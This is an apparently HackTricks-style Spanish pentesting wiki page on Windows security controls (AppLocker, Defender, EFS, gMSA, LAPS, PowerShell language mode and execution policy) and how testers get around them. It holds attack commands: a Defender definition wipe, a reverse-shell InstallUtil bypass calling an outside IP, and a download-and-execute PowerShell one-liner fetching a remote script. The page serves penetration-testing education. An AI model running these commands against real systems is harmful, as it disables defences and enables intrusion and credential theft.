# Controles de seguridad de Windows

{{#include ../banners/hacktricks-training.md}}

## Directiva de AppLocker

Una lista de aplicaciones permitidas es una lista de aplicaciones de software o ejecutables aprobados que pueden estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno frente a malware dañino y software no aprobado que no se ajuste a las necesidades específicas de la organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de Microsoft para crear listas de aplicaciones permitidas** y permite a los administradores del sistema controlar **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona **un control granular** sobre ejecutables, scripts, archivos de Windows Installer, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
Es habitual que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto se puede evadir**.

### Comprobación

Comprueba qué archivos/extensiones están en la lista de bloqueados o permitidos:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` evalúa archivos candidatos para una identidad específica frente a una política de AppLocker. Prueba la cuenta cuyo token ejecutará el payload, porque las reglas pueden estar dirigidas a usuarios o grupos; `Get-AppLockerFileInformation` también es útil para inspeccionar la ruta, el hash y los metadatos del editor con los que pueden coincidir las reglas.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Antes de considerar que un resultado de prueba denegado significa que se aplicó un bloqueo, inspecciona el **modo de aplicación efectivo de esa colección de reglas** y el servicio Application Identity. `AuditOnly` evalúa las reglas, pero sigue permitiendo la ejecución, mientras que `NotConfigured` no equivale a estar deshabilitado cuando esa colección contiene reglas.<sup>[[7]](#references)</sup> Si `AppIDSvc` está detenido, AppLocker no aplica las reglas.<sup>[[9]](#references)</sup> Estas comprobaciones permiten distinguir un bypass real de una directiva que nunca bloqueó el archivo.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Para una prueba de ejecución controlada, compara el registro de eventos de AppLocker: **8003/8006** indican que el EXE/DLL o el script/MSI se habría bloqueado en modo de auditoría; **8004/8007** indican que se bloqueó realmente. Prueba el mismo tipo de archivo y la misma identidad que en la ruta de ejecución prevista.<sup>[[8]](#references)</sup>

Esta ruta del registro contiene las configuraciones y políticas aplicadas por AppLocker, lo que permite revisar el conjunto actual de reglas aplicadas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Carpetas con permisos de escritura** útiles para evadir la política de AppLocker: Si AppLocker permite ejecutar cualquier archivo dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas con permisos de escritura** que puedes usar para **evadirla**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Los binarios [**"LOLBAS's"**](https://lolbas-project.github.io/) **de confianza** también pueden ser útiles para bypass AppLocker.
- **Las reglas mal escritas también se pueden evadir**
  - Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: puedes crear una **carpeta llamada `allowed`** en cualquier lugar y se permitirá.
  - Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero se olvidan de las **otras** [**ubicaciones del ejecutable PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- La **aplicación de reglas para DLL rara vez está habilitada** debido a la carga adicional que puede generar en un sistema y a la cantidad de pruebas necesarias para garantizar que nada se rompa. Por eso, usar **DLL como backdoors ayudará a evadir AppLocker**.
- Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar** código de Powershell en cualquier proceso y evadir AppLocker. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Almacenamiento de credenciales

### Security Accounts Manager (SAM)

Las credenciales locales están en este archivo; las contraseñas están hasheadas.

### Local Security Authority (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema para el inicio de sesión único (Single Sign-On).\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de usuarios...), la **autenticación**, los **tokens de acceso**...\
LSA es quien **comprueba** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y se **comunica** con el **controlador de dominio** para autenticar a un usuario del dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM, contraseñas fáciles de descifrar.

### Secretos de LSA

LSA puede guardar algunas credenciales en el disco:

- Contraseña de la cuenta del equipo de Active Directory (controlador de dominio inaccesible).
- Contraseñas de las cuentas de servicios de Windows
- Contraseñas de tareas programadas
- Más (contraseña de aplicaciones IIS...)

### NTDS.dit

Es la base de datos de Active Directory. Solo está presente en los controladores de dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) es un antivirus disponible en Windows 10 y Windows 11, así como en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting, como **`WinPEAS`**. Sin embargo, hay formas de **evadir estas protecciones**.

### Comprobar

Para comprobar el **estado** de **Defender**, puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (comprueba el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo, también puedes ejecutar:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Sistema de archivos cifrados (EFS)

EFS protege los archivos mediante cifrado, utilizando una **clave simétrica** conocida como **File Encryption Key (FEK)**. Esta clave se cifra con la **clave pública** del usuario y se almacena en los metadatos `$EFS` de NTFS (`$LOGGED_UTILITY_STREAM`), **no** en un flujo de datos alternativo `$DATA` ordinario.<sup>[[10]](#references)</sup> Cuando se necesita descifrar el archivo, la **clave privada** correspondiente al certificado digital del usuario descifra la FEK. Un agente de recuperación de datos (DRA) configurado tiene una copia cifrada independiente de la FEK en el campo de recuperación de datos.<sup>[[13]](#references)</sup>

**Entre los casos de descifrado sin intervención del usuario se incluyen**:

- Cuando se mueven archivos o carpetas a un sistema de archivos que no sea EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se descifran automáticamente.
- Los archivos cifrados enviados por la red mediante el protocolo SMB/CIFS se descifran antes de la transmisión.

Este método de cifrado permite al propietario **acceder de forma transparente** a los archivos cifrados. Sin embargo, cambiar simplemente la contraseña del propietario e iniciar sesión no permitirá descifrarlos.

**Conclusiones clave**:

- EFS utiliza una FEK simétrica, cifrada con la clave pública del usuario.
- El descifrado utiliza la clave privada del usuario para acceder a la FEK.
- El descifrado automático se produce en determinadas condiciones, como al copiar archivos a FAT32 o transmitirlos por la red.
- El propietario puede acceder a los archivos cifrados sin pasos adicionales.

### Comprobar la información de EFS

No deduzcas que se usa EFS a partir de `%APPDATA%\Microsoft\Protect`: allí se almacenan claves maestras de DPAPI para muchas funciones de Windows.<sup>[[19]](#references)</sup> En su lugar, inspecciona un archivo cifrado con `cipher /c "C:\path\file"` para enumerar sus certificados de usuario y de recuperación. `cipher /e` y `cipher /d` cifran y descifran archivos para una entidad que tenga la clave privada correspondiente.<sup>[[11]](#references)</sup>

### Descifrar archivos EFS

Si `cipher /c` muestra un certificado de recuperación y tienes su **clave privada DRA correspondiente** en un PFX, importa ese PFX en el almacén de certificados del usuario actual y, después, descifra el archivo.<sup>[[11]](#references)[[12]](#references)</sup> Un certificado DRA recién generado no puede descifrar archivos antiguos: su clave pública debe haberse incluido cuando se cifró el archivo. El acceso mediante ACL de NTFS o el restablecimiento de la contraseña de la cuenta, por sí solos, no proporcionan la clave privada necesaria.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Ser autoridad del sistema

Este enfoque requiere que el **usuario víctima** esté **ejecutando** un **proceso** en el host. Si es así, desde una sesión de `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). Como alternativa, puedes hacer `migrate` al proceso del usuario.

#### Conocer la contraseña del usuario

Mimikatz puede importar el certificado y la clave privada del usuario y luego usarlos para descifrar archivos protegidos con EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Cuentas de servicio administradas de grupo (gMSA)

Microsoft desarrolló las **cuentas de servicio administradas de grupo (gMSA)** para simplificar la administración de las cuentas de servicio en las infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales, que suelen tener habilitada la opción "**La contraseña nunca caduca**", las gMSA ofrecen una solución más segura y fácil de administrar:

- **Administración automática de contraseñas**: las gMSA usan una contraseña compleja de 240 bytes que normalmente se cambia cada 30 días. Los controladores de dominio la derivan usando material de clave KDS, lo que elimina la necesidad de actualizar las contraseñas manualmente.<sup>[[16]](#references)[[20]](#references)</sup>
- **Seguridad mejorada**: estas cuentas no se ven afectadas por los bloqueos y no se pueden usar para iniciar sesión de forma interactiva, lo que mejora su seguridad.
- **Compatibilidad con varios hosts**: las gMSA se pueden compartir entre varios hosts, por lo que son ideales para servicios que se ejecutan en varios servidores.
- **Compatibilidad con tareas programadas**: a diferencia de las cuentas de servicio administradas, las gMSA permiten ejecutar tareas programadas.
- **Administración simplificada de SPN**: el sistema actualiza automáticamente el Nombre principal del servicio (SPN) cuando cambian los detalles de sAMaccount o el nombre DNS del equipo, lo que simplifica la administración de SPN.

Un controlador de dominio construye el atributo LDAP _**msDS-ManagedPassword**_ al leer material de contraseña derivado de KDS; el valor no es una contraseña almacenada de forma independiente. Normalmente cambia cada 30 días.<sup>[[20]](#references)</sup> El [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) devuelto **no es una contraseña cifrada**: su campo `CurrentPassword` contiene la contraseña en texto sin cifrar.<sup>[[14]](#references)</sup> El acceso se comprueba mediante `msDS-GroupMSAMembership`, por lo que cualquier principal con permisos de recuperación está dentro del alcance, no solo los administradores o los hosts del servicio.<sup>[[15]](#references)</sup> La conexión LDAP debe proporcionar confidencialidad, por ejemplo, mediante LDAPS o el sellado SASL.<sup>[[20]](#references)</sup>

Para la derivación de contraseñas sin conexión tras la exposición de la clave raíz de KDS, consulta [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Encuentra más información en esta publicación**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Además, consulta esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un **ataque NTLM relay** para **leer** la **contraseña** de **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Durante la enumeración, distingue entre **Microsoft LAPS heredado** y la implementación nativa de **Windows LAPS**. Windows LAPS se publicó en las actualizaciones de Windows del 11 de abril de 2023 y puede realizar una copia de seguridad de la contraseña de un administrador local gestionado en **Windows Server Active Directory** o **Microsoft Entra ID**. En implementaciones respaldadas por AD, también puede cifrar contraseñas, conservar el historial de contraseñas cifradas y gestionar la contraseña DSRM de un controlador de dominio. El MSI heredado descargable está obsoleto en las versiones más recientes de Windows, aunque Windows LAPS puede funcionar en modo de emulación heredada.<sup>[[6]](#references)</sup>

Como Microsoft LAPS heredado y Windows LAPS son implementaciones independientes, identifica cuál está implementada antes de aplicar ataques específicos para atributos o cmdlets. La página enlazada cubre la detección, la enumeración de ACL, la recuperación, la manipulación de la caducidad y la recuperación sin conexión, sin repetir aquí esos procedimientos.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

El [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) de PowerShell **restringe muchas de las funciones** necesarias para usar PowerShell eficazmente, como el bloqueo de objetos COM, la autorización exclusiva de tipos .NET aprobados, los flujos de trabajo basados en XAML, las clases de PowerShell y más.

### **Comprobar**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` era una degradación heredada solo en hosts con el motor opcional de PowerShell 2 instalado. Ya no se incluye en Windows 11 24H2 ni Windows Server 2025 actualizados; no lo consideres un bypass actual de CLM.<sup>[[17]](#references)</sup> Con el control de aplicaciones, PowerShell ejecuta código no confiable en Constrained Language, mientras que los scripts de confianza según la directiva pueden ejecutarse en Full Language.<sup>[[18]](#references)</sup>

Para configuraciones anteriores, puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, puede que necesites** **_Add a Reference_** -> _Browse_ ->_Browse_ -> añadir `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar** código de Powershell en cualquier proceso y omitir el modo restringido. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Directiva de ejecución de PS

De forma predeterminada, está configurada como **restricted.** Principales formas de omitir esta directiva:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Se puede encontrar más información [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Es la API que se puede usar para autenticar usuarios.

SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que quieran comunicarse. El método preferido es Kerberos. Después, SSPI negociará qué protocolo de autenticación se usará. Estos protocolos de autenticación se llaman Security Support Provider (SSP), se encuentran en cada máquina Windows en forma de DLL y ambas máquinas deben admitir el mismo para poder comunicarse.

### SSP principales

- **Kerberos**: El preferido
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** y **NTLMv2**: Por motivos de compatibilidad
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web y LDAP, contraseña en forma de hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL y TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Se usa para negociar el protocolo que se utilizará (Kerberos o NTLM, siendo Kerberos el predeterminado)
  - %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de cuentas de usuario

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita un **aviso de consentimiento para actividades con privilegios elevados**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Cómo omitir AppLocker y el modo de lenguaje restringido de PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [Cómo descifrar archivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relay para gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 formas de omitir la directiva de ejecución de PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Usar los cmdlets de Windows PowerShell de AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Descripción general de Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Trabajar con reglas de AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Usar el Visor de eventos con AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Procesos e interacciones de AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Flujos de archivos (sistemas de archivos locales)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Comando Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Comando Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Hacer una copia de seguridad de la clave privada EFS del agente de recuperación](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Atributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Proteger las cuentas de servicio administradas de grupo](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Características eliminadas de Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Usar App Control para proteger PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Evento 4693 y claves maestras de DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Construcción de msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
